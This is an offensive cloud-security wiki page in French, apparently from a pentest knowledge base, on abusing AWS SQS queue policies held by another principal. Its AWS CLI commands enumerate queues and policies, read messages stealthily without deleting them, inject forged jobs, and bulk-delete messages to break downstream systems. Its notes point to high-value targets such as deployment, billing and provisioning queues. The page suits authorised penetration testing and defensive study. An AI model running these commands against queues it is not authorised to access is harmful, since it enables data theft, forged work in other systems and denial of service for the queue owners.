---
title: "SQS : lire, injecter et supprimer des messages de file"
description: "Abuser des politiques de file SQS pour lire, injecter ou supprimer des messages dans la file d'un autre principal."
keywords:
  - SQS
  - queue policy
  - message
  - inject
  - read
---

# SQS

Simple Queue Service détient les messages applicatifs entre un producteur et son consommateur. La **politique de ressource** d'une file décide qui peut agir dessus, et lorsqu'elle autorise un principal que vous détenez (ou qu'elle est wildcardée ou cross-account), vous pouvez lire les messages en transit, injecter du travail falsifié que le consommateur traitera, ou supprimer des messages pour casser le système qui en dépend.

## Énumérer les files et l'accès

```bash
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy All
```

L'attribut `Policy` montre quels principaux peuvent faire `SendMessage`, `ReceiveMessage` et `DeleteMessage`.

## Lire, injecter et supprimer

```bash
# read work in flight (long poll, do not delete so the consumer still sees it)
aws sqs receive-message --queue-url <url> --max-number-of-messages 10 --wait-time-seconds 20

# inject a forged message the consumer will process
aws sqs send-message --queue-url <url> --message-body '{"job":"forged"}'

# drop messages to deny the downstream system
aws sqs receive-message --queue-url <url> | jq -r .Messages[].ReceiptHandle | \
  xargs -I{} aws sqs delete-message --queue-url <url> --receipt-handle {}
```

## Notes d'exploitation

- Un message reçu devient invisible pendant sa fenêtre de visibility-timeout ; lisez sans supprimer pour rester discret, puisque le consommateur le relit après le timeout.
- Les messages injectés sont une entrée de confiance pour le consommateur ; si le consommateur est une Lambda ou un worker, un corps falsifié peut provoquer des chemins de code ou des appels en aval.
- Les files qui alimentent de l'automatisation (déploiements, facturation, provisionnement) sont de grande valeur : un message falsifié ou supprimé change ce que fait le pipeline.

## Outils

- **AWS CLI** (`sqs receive-message` / `send-message` / `delete-message`).
- **Pacu** (`sqs__enum`) : énumération des files et des politiques.

## Références

- [HackTricks Cloud : abus de SQS AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sqs-enum.html)
- [AWS : politique d'accès SQS](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-overview-of-managing-access.html)
- [Rhino Security Labs : recherche offensive AWS](https://rhinosecuritylabs.com/aws/)
- [Hacking the Cloud : techniques offensives AWS](https://hackingthe.cloud/)
